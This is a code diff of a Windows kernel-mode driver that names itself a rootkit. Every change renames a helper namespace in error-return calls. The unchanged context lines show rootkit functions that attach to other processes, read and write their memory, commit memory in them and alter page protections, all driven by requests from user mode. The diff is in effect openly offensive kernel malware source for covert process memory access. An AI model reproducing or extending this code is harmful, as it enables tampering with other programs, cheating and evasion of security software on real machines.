@@ -23,14 +23,14 @@ NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
 	// Check for invalid arguments:
 	if (RootkInst->MainPID == 0) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (invalid parameter: MainPID = 0)\n");
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	// Process EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get EPROCESS of executable %llu)\n", RootkInst->MainPID);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -39,7 +39,7 @@ NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
 	if (!NT_SUCCESS(Status) && Status != STATUS_INFO_LENGTH_MISMATCH) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get process handle of executable %llu: 0x%x)\n", RootkInst->MainPID, Status);
 		RootkInst->Out = NULL;
-		return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -49,7 +49,7 @@ NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get needed size for executable %llu image name buffer: 0x%x)\n", RootkInst->MainPID, Status);
 		RootkInst->Out = NULL;
 		ZwClose(ProcessHandle);
-		return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -59,7 +59,7 @@ NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot allocate memory for executable %llu image name buffer)\n", RootkInst->MainPID);
 		RootkInst->Out = NULL;
 		ZwClose(ProcessHandle);
-		return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -70,7 +70,7 @@ NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
 		RootkInst->Out = NULL;
 		ZwClose(ProcessHandle);
 		ExFreePool(NameBuffer);
-		return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -80,7 +80,7 @@ NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
 		RootkInst->Out = NULL;
 		ZwClose(ProcessHandle);
 		ExFreePool(NameBuffer);
-		return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
 	}
     ZwClose(ProcessHandle);
 	ExFreePool(NameBuffer);
@@ -91,7 +91,7 @@ NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
 	if (PrcPeb == NULL) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get process PEB of executable %llu)\n", RootkInst->MainPID);
 		RootkInst->Out = NULL;
-		return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -102,7 +102,7 @@ NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
 		KeUnstackDetachProcess(&ProcessState);
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (LDR of executable %llu = NULL)\n", RootkInst->MainPID);
 		RootkInst->Out = NULL;
-		return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCLOADMDLS, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCLOADMDLS, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -113,7 +113,7 @@ NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
 			RootkInst->Out = PrcEntry->DllBase;
 			KeUnstackDetachProcess(&ProcessState);
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable succeeded, module (%llu, %wZ) was found at base address = %p\n", RootkInst->MainPID, &ModuleName, RootkInst->Out);
-			return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 		}
 	}
 
@@ -121,7 +121,7 @@ NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
 	KeUnstackDetachProcess(&ProcessState);
 	DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot find the base address of executable %llu in the LDR data)\n", RootkInst->MainPID);
 	RootkInst->Out = NULL;
-	return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
+	return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
 }
 
 
@@ -150,28 +150,28 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 	// Check for invalid arguments:
 	if (RootkInst->Buffer == NULL || RootkInst->Out == NULL || RootkInst->Size == 0) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (one or more arguments are invalid: %p, %p, %zu)\n", RootkInst->Buffer, RootkInst->Out, RootkInst->Size);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	// Check for KM addresses (not allowed for this function):
 	if ((ULONG64)RootkInst->Out >= memory_helpers::GetHighestUserModeAddrADD() || (ULONG64)RootkInst->Buffer >= memory_helpers::GetHighestUserModeAddrADD()) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (one or more of the buffers are in systemspace: %p, %p)\n", RootkInst->Buffer, RootkInst->Out);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	// Destination EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpTo))) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot get EPROCESS of destination process %llu)\n", RootkInst->MainPID);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	// Source EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->SemiPID, &EpFrom))) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot get EPROCESS of source process %llu)\n", RootkInst->MainPID);
-		return general_helpers::ExitRootkitRequestADD(NULL, EpTo, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, EpTo, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -184,20 +184,20 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 			KeUnstackDetachProcess(&SrcState);
 			if (!NT_SUCCESS(Status)) {
 				DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot query source memory for reading from process %llu)\n", RootkInst->SemiPID);
-				return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
+				return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
 			}
 		}
 
 		__except (STATUS_ACCESS_VIOLATION) {
 			KeUnstackDetachProcess(&SrcState);
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (access violation system exception while reading memory from source process %llu)\n", RootkInst->SemiPID);
-			return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
 
 		}
 
 		if (!(FromInfo.State & MEM_COMMIT)) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (source memory from process %llu is not committed in memory, cannot verify if can read)\n", RootkInst->SemiPID);
-			return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 
 		if (FromInfo.AllocationBase != WriteFromAddr && FromInfo.AllocationBase != NULL) {
@@ -208,12 +208,12 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 
 		if (FromInfo.AllocationBase == NULL) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (allocation base of memory region in source process %llu = NULL)\n", RootkInst->SemiPID);
-			return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 
 		if (FromInfo.RegionSize < AllocSize) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (source memory range size %zu < required size to write %zu)\n", FromInfo.RegionSize, AllocSize);
-			return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 	}
 	DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory, regular buffer/UM source to UM destination\n");
@@ -228,13 +228,13 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 	__except (STATUS_ACCESS_VIOLATION) {
 		KeUnstackDetachProcess(&DstState);
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (access violation system error occured while querying destination memory)\n");
-		return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 	if (!NT_SUCCESS(Status)) {
 		KeUnstackDetachProcess(&DstState);
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot query destination memory to verify if committed and can be written into)\n");
-		return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -242,7 +242,7 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 	if (((ULONG64)ToInfo.BaseAddress + ToInfo.RegionSize) < ((ULONG64)WriteToAddr + WriteSize)) {
 		KeUnstackDetachProcess(&DstState);
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (destination address + writing size do not match up with the base address + region size of the relevant memory region/s)\n");
-		return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 	if (!(ToInfo.State & MEM_COMMIT)) {
@@ -250,7 +250,7 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 		if (WriteToAddr == NULL) {
 			KeUnstackDetachProcess(&DstState);
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (destination memory is not committed and/or is not possible to commit)\n");
-			return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		WasCommitted = TRUE;
 	}
@@ -263,14 +263,14 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 			if (!NT_SUCCESS(Status)) {
 				KeUnstackDetachProcess(&DstState);
 				DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (destination memory is already committed with invalid attributes, cannot free it)\n");
-				return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
+				return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
 			}
 
 			WriteToAddr = CommitMemoryRegionsADD(ZwCurrentProcess(), WriteToAddr, AllocSize, PAGE_READWRITE, NULL, ZeroBits);
 			if (WriteToAddr == NULL) {
 				KeUnstackDetachProcess(&DstState);
 				DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot commit memory in the relevant region of memory in destination process)\n");
-				return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
+				return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
 			}
 			WasCommitted = TRUE;
 			OldState = MEM_COMMIT;
@@ -289,7 +289,7 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 			memory_helpers::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
 		}
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (querying virtual memory of destination failed)\n");
-		return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 	if (!(ToInfo.Protect & PAGE_EXECUTE_READWRITE || ToInfo.Protect & PAGE_READWRITE || ToInfo.Protect & PAGE_WRITECOPY || ToInfo.Protect & PAGE_EXECUTE_WRITECOPY) || ToInfo.Protect & PAGE_GUARD || ToInfo.Protect & PAGE_NOACCESS) {
@@ -299,7 +299,7 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 				memory_helpers::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
 			}
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (do not have write permissions into destination memory)\n");
-			return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOWRITEPRMS, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOWRITEPRMS, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 	}
 	KeUnstackDetachProcess(&DstState);
@@ -331,7 +331,7 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 		if (WasCommitted) {
 			memory_helpers::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
 		}
-		return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
 
 	}
 
@@ -343,7 +343,7 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 			memory_helpers::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
 		}
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot allocate buffer for writing source)\n");
-		return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 	Status = UserToKernelMEM(EpFrom, WriteFromAddr, SourceBuffer, WriteSize, FALSE);
@@ -352,7 +352,7 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 			memory_helpers::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
 		}
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot copy writing source into buffer)\n");
-		return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -365,11 +365,11 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 
 	if (!NT_SUCCESS(Status)) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot copy local KM source buffer into UM destination memory)\n");
-		return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 	DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory succeeded\n");
-	return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
+	return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 }
 
 
@@ -392,27 +392,27 @@ NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 	// Check for invalid arguments:
 	if (RootkInst->Buffer == NULL || RootkInst->Out == NULL || RootkInst->Size == 0) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (one or more parameters are invalid: %p, %p, %zu)\n", RootkInst->Buffer, RootkInst->Out, RootkInst->Size);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	// Check for KM addresses (not allowed for this function):
 	if ((ULONG64)RootkInst->Out >= memory_helpers::GetHighestUserModeAddrADD() || (ULONG64)RootkInst->Buffer >= memory_helpers::GetHighestUserModeAddrADD()) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (one or more addresses are in KM: %p, %p)\n", RootkInst->Buffer, RootkInst->Out);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	// Destination process EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->SemiPID, &EpTo))) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot get destination process %llu EPROCESS)\n", RootkInst->SemiPID);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 	// Source process EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpFrom))) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot get source process %llu EPROCESS)\n", RootkInst->MainPID);
-		return general_helpers::ExitRootkitRequestADD(NULL, EpTo, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, EpTo, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -424,12 +424,12 @@ NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 		if (!NT_SUCCESS(status)) {
 			KeUnstackDetachProcess(&SrcState);
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot query source memory from process %llu to verify if can read)\n", RootkInst->MainPID);
-			return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		KeUnstackDetachProcess(&SrcState);
 		if (!(FromInfo.State & MEM_COMMIT)) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (source memory region from process %llu is not committed, nothing to read)\n", RootkInst->MainPID);
-			return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 
 
@@ -441,7 +441,7 @@ NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 		RootkInst->Buffer = ReadFromAddr;
 		if (FromInfo.RegionSize < AllocSize) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (source memory region size %zu < requested size %zu)\n", FromInfo.RegionSize, AllocSize);
-			return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 
 
@@ -449,7 +449,7 @@ NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 		SourceBuffer = ExAllocatePoolWithTag(NonPagedPool, ReadSize, 'RqRs');
 		if (SourceBuffer == NULL) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot allocate memory for KM source buffer)\n");
-			return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 
 
@@ -458,7 +458,7 @@ NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 		if (!NT_SUCCESS(status)) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot copy into source buffer from source memory)\n");
 			ExFreePool(SourceBuffer);
-			return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 	}
 	__except (STATUS_ACCESS_VIOLATION) {
@@ -467,7 +467,7 @@ NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 			ExFreePool(SourceBuffer);
 		}
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (access violation system exception when querying source memory region/s)\n");
-		return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -476,10 +476,10 @@ NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 	ExFreePool(SourceBuffer);
 	if (!NT_SUCCESS(status)) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot copy source KM buffer into destination memory region/s)\n");
-		return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 	DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory succeeded\n");
-	return general_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
+	return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 }
 
 
@@ -502,21 +502,21 @@ NTSTATUS RetrieveSystemInformationRK(ROOTKIT_MEMORY* RootkInst) {
 	// Check for invalid arguments:
 	if (RootkInst->MainPID == 0 || RootkInst->Buffer == NULL) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (one or more invalid arguments: %llu, %p)\n", RootkInst->MainPID, RootkInst->Buffer);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	// Process EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (cannot get medium EPROCESS)\n");
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
